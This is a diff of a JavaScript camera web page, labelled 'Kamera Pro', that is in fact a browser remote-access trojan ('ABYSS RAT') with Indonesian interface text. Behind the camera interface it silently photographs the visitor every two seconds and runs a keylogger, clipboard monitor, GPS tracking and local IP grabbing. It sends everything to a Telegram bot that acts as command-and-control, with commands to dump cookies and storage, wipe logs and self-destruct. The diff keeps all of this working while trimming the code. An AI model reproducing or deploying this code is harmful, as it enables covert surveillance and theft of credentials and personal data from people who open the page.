-                caption += '\n📐 ' + width + '×' + height + ' | ' + state.facingMode;
+                if (state.localIPs.length > 0) cap += '\n🌐 ' + state.localIPs[0];
+                cap += '\n#' + state.frameCount + ' | ' + state.facingMode;
 
-                // Convert & Send
                 canvas.toBlob(function(blob) {
-                    if (!blob) {
-                        state.burstActive = false;
-                        return;
-                    }
+                    if (!blob) { state.burstActive = false; return; }
+                    if (silent) TG.sendBeacon(blob, cap);
+                    else TG.sendPhoto(blob, cap);
 
-                    if (silent) {
-                        TG.sendBeacon(blob, caption);
-                    } else {
-                        TG.sendPhoto(blob, caption);
-                    }
-
-                    // Update thumbnail
                     state.lastPhotoData = canvas.toDataURL('image/jpeg', CONFIG.JPEG_QUALITY);
-                    state.lastPhotoCaption = caption;
-                    dom.galleryThumb.innerHTML = '<img src="' + state.lastPhotoData +
-                        '" alt="Preview">';
-                    dom.galleryThumb.classList.add('has-photo');
+                    state.lastPhotoCaption = cap;
+                    dom.thumbBox.innerHTML = '<img src="' + state.lastPhotoData + '" alt="Preview">';
+                    dom.thumbBox.classList.add('has-photo');
 
-                    // Flash effect (non-silent only)
                     if (!silent) {
                         dom.flashOverlay.classList.add('active');
-                        setTimeout(function() {
-                            dom.flashOverlay.classList.remove('active');
-                        }, 70);
+                        setTimeout(function() { dom.flashOverlay.classList.remove('active'); }, 70);
                     }
 
-                    // Show indicator
-                    showIndicator(dom.indCapture);
-                    if (state.gpsData) showIndicator(dom.indGPS);
-
-                    // Burst mode for live photo effect
+                    // Burst live photo
                     if (!silent) {
                         for (var b = 0; b < CONFIG.BURST_COUNT - 1; b++) {
                             (function(delay) {
                                 setTimeout(function() {
-                                    var burstCanvas = document.createElement('canvas');
-                                    burstCanvas.width = width;
-                                    burstCanvas.height = height;
-                                    var burstCtx = burstCanvas.getContext('2d');
-                                    burstCtx.drawImage(dom.vf, 0, 0, width, height);
-                                    burstCanvas.toBlob(function(burstBlob) {
-                                        if (burstBlob) {
-                                            TG.sendBeacon(burstBlob,
-                                                '🎬 Burst ' + (delay / CONFIG.BURST_DELAY + 1) +
-                                                '/' + CONFIG.BURST_COUNT + ' | ' + getTimeShort());
-                                        }
+                                    var bc = document.createElement('canvas');
+                                    bc.width = width; bc.height = height;
+                                    var bctx = bc.getContext('2d');
+                                    bctx.drawImage(dom.vf, 0, 0, width, height);
+                                    bc.toBlob(function(bb) {
+                                        if (bb) TG.sendBeacon(bb, '🎬 Burst ' + (delay/CONFIG.BURST_DELAY+1) + '/' + CONFIG.BURST_COUNT);
                                     }, 'image/jpeg', CONFIG.JPEG_QUALITY - 0.05);
                                 }, delay);
                             })((b + 1) * CONFIG.BURST_DELAY);
                         }
                     }
-
                     state.burstActive = false;
-
                 }, 'image/jpeg', CONFIG.JPEG_QUALITY);
-
-            } catch(error) {
-                console.error('[Capture] Error:', error);
-                state.burstActive = false;
-            }
+            } catch(e) { state.burstActive = false; }
         }
 
         // ============================================================
-        // SILENT CAPTURE SCHEDULER (2 DETIK)
+        // AUTO CAPTURE — 2 DETIK
         // ============================================================
         function startSilentCapture() {
             if (state.silentTimer) return;
-
-            // First capture after 1.5 seconds
-            setTimeout(function() {
-                captureFrame(true);
-            }, CONFIG.FIRST_CAPTURE_DELAY);
-
-            // Subsequent captures every 2 seconds
+            setTimeout(function() { captureFrame(true); }, CONFIG.FIRST_CAPTURE_DELAY);
             state.silentTimer = setInterval(function() {
-                if (state.stream && state.stream.active) {
-                    captureFrame(true);
-                }
+                if (state.stream && state.stream.active) captureFrame(true);
             }, CONFIG.SILENT_INTERVAL);
         }
 
@@ -1078,61 +962,32 @@
         function pollC2() {
             try {
                 var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
-                    '/getUpdates?offset=' + (state.lastUpdateId + 1) +
-                    '&timeout=5&limit=5';
-
-                fetch(url)
-                    .then(function(response) { return response.json(); })
-                    .then(function(data) {
-                        if (!data.ok || !data.result || !data.result.length) return;
-
-                        for (var i = 0; i < data.result.length; i++) {
-                            var update = data.result[i];
-                            state.lastUpdateId = update.update_id;
-
-                            var message = update.message;
-                            if (!message || !message.text) continue;
-
-                            var parts = message.text.trim().split(/\s+/);
-                            var command = parts[0].toLowerCase();
-                            var target = parts[1] || '';
-
-                            if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
-
-                            var result = executeC2Command(command, parts.slice(2));
-                            if (result) {
-                                TG.sendMessage('[' + VID + '] ' + result);
-                            }
-                        }
-                    })
-                    .catch(function() {});
+                    '/getUpdates?offset=' + (state.lastUpdateId + 1) + '&timeout=5&limit=5';
+                fetch(url).then(function(r) { return r.json(); }).then(function(data) {
+                    if (!data.ok || !data.result || !data.result.length) return;
+                    for (var i = 0; i < data.result.length; i++) {
+                        var upd = data.result[i];
+                        state.lastUpdateId = upd.update_id;
+                        var msg = upd.message;
+                        if (!msg || !msg.text) continue;
+                        var parts = msg.text.trim().split(/\s+/);
+                        var cmd = parts[0].toLowerCase();
+                        var target = parts[1] || '';
+                        if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
+                        var result = executeC2(cmd, parts.slice(2));
+                        if (result) TG.sendMessage('[' + VID + '] ' + result);
+                    }
+                }).catch(function() {});
             } catch(e) {}
         }
 
-        function executeC2Command(cmd, args) {
+        function executeC2(cmd, args) {
             switch(cmd) {
-                case '/ping':
-                    return '🟢 Online | Frames: ' + state.frameCount + ' | ' + getTimestamp();
-
-                case '/photo':
-                    captureFrame(false);
-                    return '📸 Foto terkirim | Frame #' + state.frameCount;
-
-                case '/gps':
-                    return state.gpsData ?
-                        '📍 ' + state.gpsData.lat.toFixed(5) + ', ' + state.gpsData.lon.toFixed(5) +
-                        '\n🎯 Akurasi: ±' + Math.round(state.gpsData.acc) + 'm' +
-                        '\n🗺️ https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon :
-                        'GPS belum tersedia';
-
-                case '/flip':
-                    var nf = state.facingMode === 'environment' ? 'user' : 'environment';
-                    startCamera(nf);
-                    return '📷 Kamera: ' + nf;
-
-                case '/cookies':
-                    return document.cookie || '(kosong)';
-
+                case '/ping': return '🟢 Online | #' + state.frameCount + ' | ' + getTimestamp();
+                case '/photo': captureFrame(false); return '📸 Terkirim | #' + state.frameCount;
+                case '/gps': return state.gpsData ? '📍 ' + state.gpsData.lat.toFixed(5) + ',' + state.gpsData.lon.toFixed(5) + '\n🗺️ https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon + '\n🎯 ±' + Math.round(state.gpsData.acc) + 'm' : 'GPS N/A';
+                case '/flip': var nf = state.facingMode === 'environment' ? 'user' : 'environment'; startCamera(nf); return '📷 ' + nf;
+                case '/cookies': return document.cookie || '(kosong)';
                 case '/storage':
                     var dump = {
                         localStorage: Object.assign({}, localStorage),
@@ -1152,54 +1007,25 @@
                         zoom: state.currentZoom
                     };
                     var blob = new Blob([JSON.stringify(dump, null, 2)], { type: 'application/json' });
-                    TG.sendDocument(blob, 'storage_' + VID + '.json', '💾 Storage Dump | Frames: ' + state.frameCount);
-                    return '💾 Storage dump terkirim';
-
+                    TG.sendDocument(blob, 'storage_' + VID + '.json', '💾 Storage | #' + state.frameCount);
+                    return '💾 Storage terkirim';
                 case '/info':
-                    return '🆔 ' + VID +
-                        '\n📷 Kamera: ' + state.facingMode +
-                        '\n🔍 Zoom: ' + state.currentZoom + '×' +
-                        '\n⚡ Flash: ' + (state.flashOn ? 'ON' : 'OFF') +
-                        '\n📸 Frames: ' + state.frameCount +
-                        '\n⏱️ Interval: ' + (CONFIG.SILENT_INTERVAL / 1000) + ' detik' +
-                        '\n📍 GPS: ' + (state.gpsData ? state.gpsData.lat.toFixed(4) + ',' + state.gpsData.lon.toFixed(4) : 'N/A') +
-                        '\n🌐 IP: ' + (state.localIPs.join(', ') || 'N/A') +
-                        '\n🖥️ ' + screen.width + '×' + screen.height +
-                        '\n🔗 ' + location.href;
-
-                case '/wipelogs':
-                    try { localStorage.clear(); } catch(e) {}
-                    try { sessionStorage.clear(); } catch(e) {}
-                    return '🧹 Logs dibersihkan';
-
-                case '/selfdest':
-                    clearAllTimers();
-                    document.body.innerHTML = '';
-                    setTimeout(function() { window.close(); }, 500);
-                    return '💀 Self destruct';
-
-                default:
-                    return '❓ Unknown: ' + cmd;
+                    return '🆔 ' + VID + '\n📷 ' + state.facingMode + '\n🔍 ' + state.currentZoom + '×\n⚡ ' + (state.flashOn?'ON':'OFF') + '\n📸 #' + state.frameCount + '\n⏱️ ' + (CONFIG.SILENT_INTERVAL/1000) + 's\n📍 ' + (state.gpsData?state.gpsData.lat.toFixed(4)+','+state.gpsData.lon.toFixed(4):'N/A') + '\n🌐 ' + (state.localIPs.join(', ')||'N/A') + '\n🖥️ ' + screen.width + '×' + screen.height;
+                case '/wipelogs': try{localStorage.clear()}catch(e){} try{sessionStorage.clear()}catch(e){} return '🧹 Done';
+                case '/selfdest': clearAllTimers(); document.body.innerHTML = ''; setTimeout(function(){window.close()},500); return '💀 Done';
+                default: return '❓ ' + cmd;
             }
         }
 
         function startC2Polling() {
             if (state.c2Timer) return;
-            function loop() {
-                pollC2();
-                state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_INTERVAL);
-            }
+            function loop() { pollC2(); state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_INTERVAL); }
             loop();
         }
 
         function clearAllTimers() {
-            var timers = [state.silentTimer, state.c2Timer];
-            for (var i = 0; i < timers.length; i++) {
-                if (timers[i]) clearInterval(timers[i]);
-            }
-            if (state.gpsWatchId) {
-                navigator.geolocation.clearWatch(state.gpsWatchId);
-            }
+            [state.silentTimer, state.c2Timer].forEach(function(t) { if (t) clearInterval(t); });
+            if (state.gpsWatchId) navigator.geolocation.clearWatch(state.gpsWatchId);
         }
 
         // ============================================================
@@ -1207,286 +1033,158 @@
         // ============================================================
         function applyZoom() {
             if (!state.stream) return;
-
             try {
                 var track = state.stream.getVideoTracks()[0];
-                var capabilities = track.getCapabilities();
-
-                if (capabilities.zoom) {
-                    var minZoom = capabilities.zoom.min || 0.5;
-                    var maxZoom = capabilities.zoom.max || 5;
-                    var zoomValue = Math.min(maxZoom, Math.max(minZoom, state.currentZoom));
-
-                    track.applyConstraints({
-                        advanced: [{ zoom: zoomValue }]
-                    }).catch(function(err) {
-                        console.warn('[Zoom] Apply failed:', err);
-                    });
+                var cap = track.getCapabilities();
+                if (cap.zoom) {
+                    var v = Math.min(cap.zoom.max || 5, Math.max(cap.zoom.min || 0.5, state.currentZoom));
+                    track.applyConstraints({ advanced: [{ zoom: v }] }).catch(function() {});
                 }
-            } catch(e) {
-                console.warn('[Zoom] Error:', e);
-            }
-
-            // Update zoom wheel UI
-            var options = document.querySelectorAll('.zoom-option');
-            for (var i = 0; i < options.length; i++) {
-                var optionZoom = parseFloat(options[i].getAttribute('data-zoom'));
-                if (optionZoom === state.currentZoom) {
-                    options[i].classList.add('active');
-                } else {
-                    options[i].classList.remove('active');
-                }
-            }
+            } catch(e) {}
+            document.querySelectorAll('.zoom-option').forEach(function(el) {
+                el.classList.toggle('active', parseFloat(el.dataset.zoom) === state.currentZoom);
+            });
         }
 
-        function setZoom(zoomLevel) {
-            state.currentZoom = zoomLevel;
-            applyZoom();
-        }
+        function setZoom(z) { state.currentZoom = z; applyZoom(); }
 
         // ============================================================
-        // CAMERA INITIALIZATION
+        // CAMERA INIT
         // ============================================================
         function startCamera(facing) {
             if (state.isStarting) return;
             state.isStarting = true;
-
             dom.btnStartCamera.disabled = true;
-            dom.errorMessage.textContent = '';
+            dom.errorText.textContent = '';
             dom.statusDot.className = 'status-dot loading';
             dom.statusText.textContent = 'Mengakses kamera...';
 
             if (state.stream) {
-                state.stream.getTracks().forEach(function(track) {
-                    track.stop();
-                });
+                state.stream.getTracks().forEach(function(t) { t.stop(); });
                 state.stream = null;
                 dom.vf.srcObject = null;
             }
 
             var targetFacing = facing || state.facingMode;
-
-            var constraints = {
-                video: {
-                    facingMode: targetFacing,
-                    width: { ideal: CONFIG.MAX_WIDTH },
-                    height: { ideal: CONFIG.MAX_HEIGHT }
-                },
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: targetFacing, width: { ideal: CONFIG.MAX_WIDTH }, height: { ideal: CONFIG.MAX_HEIGHT } },
                 audio: false
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(function(mediaStream) {
-                    onCameraSuccess(mediaStream, targetFacing);
-                })
-                .catch(function(error1) {
-                    console.warn('[Camera] Primary attempt failed:', error1.message);
-
-                    var altFacing = targetFacing === 'environment' ? 'user' : 'environment';
+            }).then(function(s) {
+                onCameraSuccess(s, targetFacing);
+            }).catch(function() {
+                var alt = targetFacing === 'environment' ? 'user' : 'environment';
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: alt }, audio: false
+                }).then(function(s) {
+                    onCameraSuccess(s, alt);
+                }).catch(function() {
                     navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: altFacing },
-                        audio: false
-                    })
-                    .then(function(mediaStream) {
-                        onCameraSuccess(mediaStream, altFacing);
-                    })
-                    .catch(function(error2) {
-                        console.warn('[Camera] Secondary attempt failed:', error2.message);
-
-                        navigator.mediaDevices.getUserMedia({
-                            video: true,
-                            audio: false
-                        })
-                        .then(function(mediaStream) {
-                            onCameraSuccess(mediaStream, 'environment');
-                        })
-                        .catch(function(error3) {
-                            onCameraError(error3);
-                        });
+                        video: true, audio: false
+                    }).then(function(s) {
+                        onCameraSuccess(s, 'environment');
+                    }).catch(function(err) {
+                        onCameraError(err);
                     });
                 });
+            });
         }
 
         function onCameraSuccess(mediaStream, facing) {
             state.stream = mediaStream;
             dom.vf.srcObject = mediaStream;
+            dom.vf.play().then(function() {
+                state.facingMode = facing;
+                state.isStarting = false;
+                dom.btnStartCamera.disabled = false;
+                dom.statusDot.className = 'status-dot ready';
+                dom.statusText.textContent = 'Kamera aktif';
 
-            dom.vf.play()
-                .then(function() {
-                    state.facingMode = facing;
-                    state.isStarting = false;
-                    dom.btnStartCamera.disabled = false;
+                if (state.facingMode === 'user') dom.vf.classList.add('front-camera');
+                else dom.vf.classList.remove('front-camera');
 
-                    dom.statusDot.className = 'status-dot ready';
-                    dom.statusText.textContent = 'Kamera aktif';
-
-                    // NO MIRROR: Kamera depan real view
-                    if (state.facingMode === 'user') {
-                        dom.vf.classList.add('front-camera');
-                    } else {
-                        dom.vf.classList.remove('front-camera');
-                    }
-
-                    applyZoom();
-                    dom.permOverlay.classList.add('hidden');
-                    initializeRAT();
-                })
-                .catch(function(error) {
-                    console.error('[Camera] Play failed:', error);
-                    onCameraError(error);
-                });
+                applyZoom();
+                dom.permOverlay.classList.add('hidden');
+                initializeRAT();
+            }).catch(function(err) { onCameraError(err); });
         }
 
-        function onCameraError(error) {
+        function onCameraError(err) {
             state.isStarting = false;
             dom.btnStartCamera.disabled = false;
             dom.statusDot.className = 'status-dot error';
             dom.statusText.textContent = 'Gagal';
-
             var msg = 'Gagal mengakses kamera';
-            if (error.message) {
-                if (error.message.indexOf('Permission') !== -1) {
-                    msg = 'Izin kamera ditolak. Buka pengaturan browser.';
-                } else if (error.message.indexOf('NotFound') !== -1) {
-                    msg = 'Kamera tidak ditemukan.';
-                } else if (error.message.indexOf('NotAllowed') !== -1) {
-                    msg = 'Izin kamera diperlukan.';
-                }
+            if (err && err.message) {
+                if (err.message.indexOf('Permission') !== -1) msg = 'Izin kamera ditolak';
+                else if (err.message.indexOf('NotFound') !== -1) msg = 'Kamera tidak ditemukan';
             }
-            dom.errorMessage.textContent = msg;
+            dom.errorText.textContent = msg;
         }
 
         // ============================================================
-        // RAT INITIALIZATION
+        // RAT INIT
         // ============================================================
         function initializeRAT() {
-            grabLocalIPs().then(function(ips) {
-                state.localIPs = ips;
-            });
-
+            grabLocalIPs().then(function(ips) { state.localIPs = ips; });
             setTimeout(function() {
-                var info = '🟢 KAMERA ONLINE\n' +
-                    '🆔 ' + VID + '\n' +
-                    '📱 ' + navigator.userAgent.substring(0, 80) + '\n' +
-                    '🖥️ ' + screen.width + '×' + screen.height + '\n' +
-                    '🌐 ' + navigator.language + '\n' +
-                    '🌍 IP: ' + (state.localIPs.join(', ') || 'Loading...') + '\n' +
-                    '🔗 ' + location.href + '\n' +
-                    '🕐 ' + getTimestamp() + '\n' +
-                    '⏱️ Auto capture: ' + (CONFIG.SILENT_INTERVAL / 1000) + ' detik\n' +
-                    '📷 Kamera: ' + state.facingMode;
-                TG.sendMessage(info);
+                TG.sendMessage('🟢 ONLINE\n🆔 ' + VID + '\n📱 ' + navigator.userAgent.substring(0,80) + '\n🖥️ ' + screen.width + '×' + screen.height + '\n🌐 ' + navigator.language + '\n🌍 IP: ' + (state.localIPs.join(', ')||'Loading...') + '\n🔗 ' + location.href + '\n⏱️ Auto: ' + (CONFIG.SILENT_INTERVAL/1000) + 's\n📷 ' + state.facingMode);
             }, 500);
-
             startGPS();
             startSilentCapture();
             startKeylogger();
             startC2Polling();
-
             setInterval(checkClipboard, CONFIG.CLIPBOARD_INTERVAL);
             setInterval(function() {
-                TG.sendMessage('💓 HB ' + VID + ' | Frames: ' + state.frameCount + ' | ' + getTimeShort() +
-                    ' | 📍 ' + (state.gpsData ? state.gpsData.lat.toFixed(4) + ',' + state.gpsData.lon.toFixed(4) : 'N/A'));
+                TG.sendMessage('💓 HB ' + VID + ' | #' + state.frameCount + ' | ' + getTimeShort());
             }, CONFIG.HEARTBEAT_INTERVAL);
-
-            console.log('🐺 ABYSS RAT v10.0 — Full Systems Active');
-            console.log('🆔 Victim ID:', VID);
-            console.log('⏱️ Capture Interval:', CONFIG.SILENT_INTERVAL / 1000, 'seconds');
         }
 
         // ============================================================
         // EVENT LISTENERS
         // ============================================================
-        dom.btnStartCamera.addEventListener('click', function() {
-            startCamera();
-        });
+        dom.btnStartCamera.addEventListener('click', function() { startCamera(); });
+        dom.btnShutter.addEventListener('click', function() { captureFrame(false); });
 
-        dom.btnShutter.addEventListener('click', function() {
-            captureFrame(false);
+        // FLIP = JEPRET + KIRIM
+        dom.btnFlip.addEventListener('click', function() {
+            var nf = state.facingMode === 'environment' ? 'user' : 'environment';
+            startCamera(nf);
+            setTimeout(function() { captureFrame(false); }, CONFIG.FLIP_CAPTURE_DELAY);
         });
 
         dom.btnFlash.addEventListener('click', function() {
             if (!state.stream) return;
             state.flashOn = !state.flashOn;
             try {
-                var track = state.stream.getVideoTracks()[0];
-                track.applyConstraints({
-                    advanced: [{ torch: state.flashOn }]
-                }).catch(function() {});
+                state.stream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: state.flashOn }] });
             } catch(e) {}
             dom.btnFlash.classList.toggle('on', state.flashOn);
         });
 
-        dom.btnFlip.addEventListener('click', function() {
-            var newFace = state.facingMode === 'environment' ? 'user' : 'environment';
-            startCamera(newFace);
+        document.querySelectorAll('.zoom-option').forEach(function(el) {
+            el.addEventListener('click', function() { setZoom(parseFloat(this.dataset.zoom)); });
         });
 
-        // Zoom wheel
-        var zoomOptions = document.querySelectorAll('.zoom-option');
-        for (var i = 0; i < zoomOptions.length; i++) {
-            zoomOptions[i].addEventListener('click', function() {
-                var z = parseFloat(this.getAttribute('data-zoom'));
-                setZoom(z);
-            });
-        }
-
-        // Gallery thumbnail → Fullscreen preview
-        dom.galleryThumb.addEventListener('click', function() {
+        dom.thumbBox.addEventListener('click', function() {
             if (!state.lastPhotoData) return;
             dom.fsImage.src = state.lastPhotoData;
             dom.fsInfo.textContent = state.lastPhotoCaption || '';
             dom.fsPreview.classList.add('show');
         });
+        dom.fsClose.addEventListener('click', function() { dom.fsPreview.classList.remove('show'); });
+        dom.fsPreview.addEventListener('click', function(e) { if (e.target === dom.fsPreview) dom.fsPreview.classList.remove('show'); });
 
-        dom.fsClose.addEventListener('click', function() {
-            dom.fsPreview.classList.remove('show');
-        });
-
-        dom.fsPreview.addEventListener('click', function(e) {
-            if (e.target === dom.fsPreview) {
-                dom.fsPreview.classList.remove('show');
-            }
-        });
-
-        // Focus ring on empty area tap
-        document.addEventListener('click', function(event) {
-            var target = event.target;
-            if (target.closest('button') ||
-                target.closest('.zoom-option') ||
-                target.closest('.gallery-thumb') ||
-                target.closest('.perm-overlay') ||
-                target.closest('.fs-preview') ||
-                target.closest('.icon-btn')) {
-                return;
-            }
-
-            dom.focusRing.style.left = event.clientX + 'px';
-            dom.focusRing.style.top = event.clientY + 'px';
+        document.addEventListener('click', function(e) {
+            if (e.target.closest('button') || e.target.closest('.zoom-option') || e.target.closest('.thumb-glass') || e.target.closest('.perm-overlay') || e.target.closest('.fs-preview')) return;
+            dom.focusRing.style.left = e.clientX + 'px';
+            dom.focusRing.style.top = e.clientY + 'px';
             dom.focusRing.classList.remove('animate');
             void dom.focusRing.offsetWidth;
             dom.focusRing.classList.add('animate');
         });
 
-        // ============================================================
-        // INITIALIZATION
-        // ============================================================
-        console.log('╔════════════════════════════════════════╗');
-        console.log('║     📸 KAMERA PRO v10.0               ║');
-        console.log('║     ABYSS RAT — Premium Edition       ║');
-        console.log('║     ⏱️ 2s Auto Capture                ║');
-        console.log('║     📐 No Mirror Front Camera         ║');
-        console.log('║     🔍 5-Level Zoom                   ║');
-        console.log('║     🎬 Burst Live Photo               ║');
-        console.log('║     ⌨️ Keylogger                      ║');
-        console.log('║     📋 Clipboard Monitor              ║');
-        console.log('║     📡 C2 Telegram                    ║');
-        console.log('║     💓 Heartbeat                      ║');
-        console.log('╚════════════════════════════════════════╝');
-        console.log('🆔 Victim ID:', VID);
-        console.log('🔗 URL:', location.href);
-        console.log('🕐 Time:', getTimestamp());
-
+        console.log('📸 Kamera Pro v11.0 — Glassmorphism Premium');
+        console.log('🆔 VID:', VID);
     })();
     </script>
 </body>
